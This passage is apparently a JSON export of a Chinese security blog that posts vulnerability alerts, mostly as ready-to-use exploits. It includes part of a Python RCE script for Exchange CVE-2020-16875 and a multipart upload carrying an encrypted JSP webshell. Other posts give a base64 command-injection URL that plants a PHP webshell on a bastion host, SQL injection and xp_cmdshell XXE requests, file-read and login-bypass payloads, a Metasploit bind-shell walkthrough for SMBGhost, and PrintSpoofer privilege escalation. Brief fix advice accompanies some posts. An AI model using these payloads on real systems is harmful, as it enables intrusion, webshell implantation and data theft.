s.post(\"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx\" % t, files=f, verify=False) assert r.status_code == 200, \"(-) failed to trigger rce!\"def leak_viewstate(t, s): r = s.get(\"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx\" % t, verify=False) match = re.search(\"&lt;input type=\\\"hidden\\\" name=\\\"__VIEWSTATE\\\" id=\\\"__VIEWSTATE\\\" value=\\\"(.*)\\\" /&gt;\", r.text) assert match != None, \"(-) couldn't leak the __viewstate!\" return match.group(1) def log_in(t, usr, pwd): s = requests.Session() d = &#123; \"destination\" : \"https://%s/owa\" % t, \"flags\" : \"\", \"username\" : usr, \"password\" : pwd &#125; s.post(\"https://%s/owa/auth.owa\" % t, data=d, verify=False) assert s.cookies.get(name='X-OWA-CANARY') != None, \"(-) couldn't leak the csrf canary!\" return sdef main(t, usr, pwd, cmd): s = log_in(t, usr, pwd) print(\"(+) logged in as %s\" % usr) vs = leak_viewstate(t, s) print(\"(+) found the __viewstate: %s\" % vs) trigger_rce(t, s, vs, cmd) print(\"(+) executed %s as SYSTEM!\" % cmd)if __name__ == '__main__': if len(sys.argv) != 4: print(\"(+) usage: %s &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;\" % sys.argv[0]) print(\"(+) eg: %s 192.168.1.1 user123:123456 calc\" % sys.argv[0]) sys.exit(-1) trgt = sys.argv[1] assert \":\" in sys.argv[2], \"(-) you need a user and password!\" usr = sys.argv[2].split(\":\")[0] pwd = sys.argv[2].split(\":\")[1] cmd = sys.argv[3] main(trgt, usr, pwd, cmd) 修复补丁：https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"NetLogon特权提升漏洞(CVE-2020-1472)","slug":"NetLogon特权提升漏洞(CVE-2020-1472)","date":"2020-09-15T15:32:14.618Z","updated":"2020-09-15T15:58:31.795Z","comments":true,"path":"2020/09/15/NetLogon特权提升漏洞(CVE-2020-1472)/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/15/NetLogon%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E(CVE-2020-1472)/","excerpt":"","text":"漏洞详情NetLogon组件 是 Windows 上一项重要的功能组件，用于用户和机器在域内网络上的认证，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系。当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的易受攻击的 Netlogon 安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。 影响版本 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) 利用 修复https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"MobileIronMDM 未授权RCE","slug":"MobileIronMDM 未授权RCE","date":"2020-09-15T15:11:57.149Z","updated":"2020-09-15T15:27:46.299Z","comments":true,"path":"2020/09/15/MobileIronMDM 未授权RCE/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/15/MobileIronMDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE/","excerpt":"","text":"exp123java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C \"&lt;Command&gt;\"java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://&lt;server-ip&gt;:1099/&lt;codebase&gt; &gt; exppython hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService'","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"2020HW第三弹","slug":"2020HW第三弹","date":"2020-09-13T15:45:00.473Z","updated":"2020-09-13T15:55:01.623Z","comments":true,"path":"2020/09/13/2020HW第三弹/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%B8%89%E5%BC%B9/","excerpt":"","text":"联软科技产品存在任意文件上传和命令执行漏洞：漏洞详情：任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。（猜测利用黑名单的其他后缀名绕过） 命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。 poc1234567891011121314POST /uai/download/uploadfileToPath.htm HTTP/1.1HOST: xxxxx-----------------------------570xxxxxxxxx6025274xxxxxxxx1Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\"Content-Type: image/png&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(\"POST\"))&#123;String k=\"xxxxxxxxxxxxxxxx\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt; -----------------------------570xxxxxxxxx6025274xxxxxxxx1Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/-----------------------------570xxxxxxxxx6025274xxxxxxxx1--","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"2020HW第二弹","slug":"2020HW第二弹","date":"2020-09-12T17:35:26.051Z","updated":"2020-09-18T02:02:26.660Z","comments":true,"path":"2020/09/13/2020HW第二弹/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/","excerpt":"","text":"PAN-OS远程代码执行漏洞（CVE-2020-2040）漏洞概述PAN-OS是一个运行在Palo Alto Networks防火墙和企业VPN设备上的操作系统。近日PAN-OS被曝出存在远程代码执行漏洞。 该漏洞是PAN-OS上的一个缓冲区溢出漏洞，当启用了强制门户或配置了多重身份验证（MFA）时，未经身份验证的攻击者可通过向Captive Portal或Multi-Factor Authentication接口发送恶意请求进行利用，可能导致系统进程中断，并允许使用root特权在PAN-OS设备上执行任意代码。 修复建议目前官方已针对此漏洞发布了更新版本，请受影响的用户尽快升级至安全版本进行防护，官方更新指南： https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html 齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）漏洞利用无需登录 利用过程: 第一，http://10.20.10.11/listener/cluster_manage.php返回“OK”。 第二，执行以下链接即可getshell，执行成功后，生成PHP一句话马/var/www/shterm/resources/qrcode/lbj77.php密码10086。这里假设10.20.10.10为堡垒机的IP地址。 1https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=10.20.10.11&amp;node_id=1$&#123;IFS&#125;|`echo$&#123;IFS&#125;\"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK\"|base64$&#123;IFS&#125;-d|bash`|$&#123;IFS&#125;|echo$&#123;IFS&#125; 修复建议 $node_id的看起来应该是一个整数，所以只需在ha_request.php文件开头，添加以下一行代码，对该变量进行过滤即可。 1 $node_id = @intval($req_node_id); 泛微云桥任意文件读取漏洞漏洞描述泛微云桥是一个为了满足用户提出的阿里钉钉与泛微OA集成需求,近日,泛微与阿里钉钉工程师多方联合,集合内部研发力量共同完成的“泛微云桥e-bridge平台”，近日泛微云桥被曝出存在任意文件读取漏洞。 影响版本： 该漏洞几乎影响2018-2019全版本。 漏洞利用1234GET /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt HTTP/1.1User-Agent: curl/7.29.0Host: 127.0.0.1Accept: */* 将相应包中的id提交 1234GET /file/fileNoLogin/xxxxxxxxxx HTTP/1.1User-Agent: curl/7.29.0Host: 127.0.0.1Accept: */* 修复建议去官网更新最新版本。 网瑞达webVPN RCE漏洞漏洞描述WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。近日网瑞达的webVPN被曝出存在RCE的漏洞。 修复建议去官网更新最新版本","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"phpstudy默认配置nginx存在解析漏洞","slug":"phpstudy默认配置nginx存在解析漏洞","date":"2020-09-11T11:16:54.440Z","updated":"2020-09-11T11:18:27.479Z","comments":true,"path":"2020/09/11/phpstudy默认配置nginx存在解析漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/11/phpstudy%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AEnginx%E5%AD%98%E5%9C%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"告警信息2020年09月03日，国内安全团队监测发现 phpstudy 发布了phpstudy 安全配置错误漏洞的风险通告，该漏洞等级为高危；phpStudy 默认配置存在 nginx 解析漏洞。 漏洞概述由于 cgi.fix_pathinfo=1 使用默认配置，效果为当前目录下文件不存在，则采用上层路径；由于info.jpg文件，而后缀是jpg，php配置文件php-fpm.conf 中的 security.limit_extensions 参数值决定了jpg是否可以解析成php，而由于windows版本中没有此文件所以默认都可以解析为php，再加上php.ini参数cgi.fix_pathinfo使用默认配置，导致Windows下 phpstudy存在nginx解析漏洞。 影响版本win：phpstudy : &lt;=8.1.0.7 漏洞复现启动phpstudy 放个图片码到web目录 蚂剑连接一句话木马成功。 修复更新到最新版","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"天X信TopApp-LB 负载均衡系统sql注入","slug":"天X信TopApp-LB 负载均衡系统sql注入","date":"2020-09-11T10:57:40.855Z","updated":"2020-09-18T16:47:17.657Z","comments":true,"path":"2020/09/11/天X信TopApp-LB 负载均衡系统sql注入/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/11/%E5%A4%A9X%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"产品概述天X信负载均衡系统TopApp为用户提高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及多数据中心的全局负载均衡解决方案。TopApp集成了压缩、缓存、SSL卸载等网络优化技术来加速业务系统交付的整个过程，提升业务系统处理效率；同时结合Web应用防火墙、DNS防火墙、DDOS攻击防护及漏洞扫描等技术手段形成全方位的网络安全防护，为用户业务系统的安全保驾护航。 POC123456789101112131415161718192021222324252627282930313233POST /acc/clsf/report/datasource.php HTTP/1.1Host:Connection: closeAccept: text/javascript, text/html, application/xml, text/xml, */*X-Prototype-Version: 1.6.0.3X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57Content-Type: application/x-www-form-urlencodedContent-Length: 201 t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@ ......","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"用友GRP-u8 XXE注入","slug":"用友GRP-u8 XXE注入","date":"2020-09-11T10:52:55.742Z","updated":"2020-09-25T04:19:20.935Z","comments":true,"path":"2020/09/11/用友GRP-u8 XXE注入/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/11/%E7%94%A8%E5%8F%8BGRP-u8%20XXE%E6%B3%A8%E5%85%A5/","excerpt":"","text":"POC12345678910111213141516171819POST /Proxy HTTP/1.1Accept: Accept: */*Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)Host: hostContent-Length: 357Connection: Keep-AliveCache-Control: no-cache cVer=9.8.0&amp;dp=&lt;?xml version=\"1.0\" encoding=\"GB2312\"?&gt;&lt;R9PACKET version=\"1\"&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format=\"text\"&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format=\"text\"&gt;exec xp_cmdshell 'net user'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"绿盟UTS综合威胁探针管理员任意登录","slug":"绿盟UTS综合威胁探针管理员任意登录","date":"2020-09-11T10:29:40.876Z","updated":"2020-09-11T10:49:50.069Z","comments":true,"path":"2020/09/11/绿盟UTS综合威胁探针管理员任意登录/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/11/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/","excerpt":"","text":"产品概述绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。 影响版本V2.0R00F02SP02及之前版本 利用 释放请求包，对响应包进行修改，将false更改为true 可以看到相应包回显了密码md5后的密文 将此md5替换登录的请求包，成功登录 修复http://update.nsfocus.com/update/listBsaUtsDetail/v/F02","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"宝塔数据库未授权访问漏洞","slug":"宝塔数据库未授权访问漏洞","date":"2020-08-23T14:59:51.686Z","updated":"2020-08-23T15:11:04.549Z","comments":true,"path":"2020/08/23/宝塔数据库未授权访问漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/23/%E5%AE%9D%E5%A1%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"产品概述宝塔面板是提升运维效率的服务器管理软件，支持一键LAMP/LNMP/集群/监控/网站/FTP/数据库/JAVA等100多项服务器管理功能。 影响版本Linux版本 7.4.2版本 Linux测试版本 7.5.14版本 Windows版 6.8版本 利用条件环境部署了phpmyadmin 漏洞利用payload ： http://ip:888/pma/ 修复升级宝塔面板至最新版本","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"深x服EDR终端检测平台存在任意用户登录漏洞","slug":"深x服EDR终端检测平台存在任意用户登录漏洞","date":"2020-08-20T01:58:52.867Z","updated":"2020-08-23T15:12:18.716Z","comments":true,"path":"2020/08/20/深x服EDR终端检测平台存在任意用户登录漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/20/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"前言本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试。 注：禁止非授权入侵 漏洞利用payload: https://ip/ui/login.php?user=arbitrarily 示例 利用payload进行任意登录 整改建议及时进行更新，关注官网补丁信息。","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"通达OA任意文件删除实现getshell","slug":"通达OA任意文件删除实现getshell","date":"2020-08-19T14:46:18.739Z","updated":"2020-08-19T14:58:11.200Z","comments":true,"path":"2020/08/19/通达OA任意文件删除实现getshell/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/19/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%9E%E7%8E%B0getshell/","excerpt":"","text":"产品概述​ 通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。 通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。 此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。 漏洞复现本地搭建通达OA环境，本次试验使用版本为11.6（其余版本自行测试） 使用exp脚本进行getshell 1python3 tongdaOA_rce.py http://192.168.168.133:8080 成功上传一句话，连接webshell 注：此漏洞利用会导致删除inc文件夹下的auth.inc.php，从而导致系统无法正常使用，禁止进行未授权测试。","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"深x服EDR v3.2.21 (20200703)源码泄露","slug":"深x服EDR v3.2.21 (20200703)源码泄露","date":"2020-08-19T04:56:48.669Z","updated":"2020-08-23T15:11:58.049Z","comments":true,"path":"2020/08/19/深x服EDR v3.2.21 (20200703)源码泄露/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/19/%E6%B7%B1x%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/","excerpt":"","text":"告警信息解决之前版本的远程任意代码注入漏洞，深x服EDR 更新到3.2.21 版本 更新文献：https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined 早期可能误传导致源码泄露（现阶段官网社区已经删除） 由于特殊时期，具体详情暂不描述 风险源码泄露能被恶意攻击者进行代码审计分析，从而挖掘出新的漏洞，达到入侵目的。 HW期间建议1.对EDR管理平台做acl策略，限制ip； 2.暂时下线","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"深x服EDR终端检测平台RCE漏洞","slug":"深x服EDR终端检测平台RCE漏洞","date":"2020-08-17T15:02:48.856Z","updated":"2020-08-23T15:12:42.343Z","comments":true,"path":"2020/08/17/深x服EDR终端检测平台RCE漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/17/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"产品概述深x服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 漏洞复现1PAYLOAD：/tool/log/c.php?strip_slashes=system&amp;host=pwd 整改建议现阶段深x服终端检测响应平台EDR出现多处漏洞，官方暂未提供相关补丁更新，建议暂时下线此平台系统，等待后续更新修复漏洞后再上线。","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"cve-2020-0787-Windows提权","slug":"cve-2020-0787-Windows提权","date":"2020-06-22T03:14:28.288Z","updated":"2020-09-18T01:46:34.875Z","comments":true,"path":"2020/06/22/cve-2020-0787-Windows提权/","link":"","permalink":"https://yejinpoxiao.xyz/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/","excerpt":"","text":"摘要Windows Background Intelligent Transfer Service 权限提升漏洞 当Windows Background Intelligent Transfer Service (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。 影响范围Windows 10，Server 2016，Server 2019，Server version 1803，Server version 1903，Server version 1909，Windows 8.1，Server 2012，Server 2012 R2 利用","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"安装python-ldap模块过坑","slug":"安装python模块过坑","date":"2020-06-19T07:13:48.922Z","updated":"2020-06-19T07:32:21.282Z","comments":true,"path":"2020/06/19/安装python模块过坑/","link":"","permalink":"https://yejinpoxiao.xyz/2020/06/19/%E5%AE%89%E8%A3%85python%E6%A8%A1%E5%9D%97%E8%BF%87%E5%9D%91/","excerpt":"","text":"Linux安装python-ldap1sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev 1sudo pip3 install python-ldap Windows安装python-ldap安装 whl 包：https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap 下载相对应的whl包，再安装即可 1pip3 install pyldap-2.4.45-cp37-cp37m-win_amd64.whl","categories":[{"name":"遇坑笔记","slug":"遇坑笔记","permalink":"https://yejinpoxiao.xyz/categories/%E9%81%87%E5%9D%91%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://yejinpoxiao.xyz/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"永恒之黑(cve-2020-0796)配合msf获取shell","slug":"永恒之黑(cve-2020-0796)配合msf获取shell","date":"2020-06-04T07:05:29.171Z","updated":"2020-09-29T02:48:02.301Z","comments":true,"path":"2020/06/04/永恒之黑(cve-2020-0796)配合msf获取shell/","link":"","permalink":"https://yejinpoxiao.xyz/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/","excerpt":"","text":"前言 今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记 影响范围Windows 10 Version 1903， Windows Server Version 1903(Server Core installation)，Windows 10 Version 1909， 和Windows Server Version 1909(Server Core installation)受到这个漏洞的影响。不过值得注意的是，引入SMBv3的Windows 8和Windows Server 2012也有可能受到影响。 工具GitHub上Fork过来的 https://github.com/YGnight/SMBGhost_RCE_PoC kali集成 metasploit ：开源安全漏洞检测工具； msfvenom ：metasploit的标准payload生成器 实操使用msfvenom生成直连exploit 1msfvenom -p windows/x64/meterpreter/bind_tcp lport=1314 -f py -o cve-2020-0796.py 将生成的与脚本exploit.py里user_payload进行替换 使用python3运行exploit （版本不要过高，本地复现使用的python3.7.4） 1python3 exploit.py -ip 192.168.168.130 运行metasploit 12345use exploit/multi/handlerset payload /windows/x64/meterpreter/bind_tcpset lport 1314 指定目标机，run 123set rhost 192.168.168.130run 得到shell","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"pipePotato-新型通用提权","slug":"pipePotato-新型通用提权","date":"2020-05-08T02:35:08.963Z","updated":"2020-06-04T07:20:32.731Z","comments":true,"path":"2020/05/08/pipePotato-新型通用提权/","link":"","permalink":"https://yejinpoxiao.xyz/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/","excerpt":"","text":"影响范围本地提权，对于任意windows Server 2012以上的windows server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在 windows Server 2012， windows Server 2016， windows Server 2019 全补丁的情况都测试成功了。 工具GitHub上有源码，自行编译即可 具体操作cmd运行 whoami #查看权限 whoami /priv #查看是否具有SeImpersonatePrivilege权限 PrintSpoofer.exe -i -c 